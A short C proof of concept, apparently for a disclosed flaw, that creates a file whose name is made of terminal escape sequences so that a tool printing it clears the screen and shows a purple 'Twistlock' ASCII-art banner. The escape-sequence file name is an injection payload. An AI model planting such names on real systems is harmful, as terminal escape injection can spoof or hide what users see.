#include <fcntl.h>

/* 
 * Twistlock print hack
 * Seems it needs only 70 characters per file for the vulnerability to take effect 
 * Also using fraction slash (unicode) because for obvious reasons can't use forward slash in filenames
 */

#define TWISTLOCK " _____       _     _   _         _   \n" \
"|_   _|_ _ _|_|___| |_| |___ ___| |_ \n" \
"  | | | | | | |_ -|  _| | . |  _| '_|\n" \
"  |_| |_____|_|___|_| |_|___|___|_,_|"

#define CLEARSCREEN "\e[2J\e[1;1H"
#define COLORFORMAT "\e[48;5;135;m\e[97m" /* Purple background and white foreground */
#define ENDFORMAT "\e[0m"

int main()
{
        open(CLEARSCREEN COLORFORMAT TWISTLOCK ENDFORMAT, O_RDWR | O_CREAT, S_IRUSR | S_IRGRP | S_IROTH);

        return 0;
}

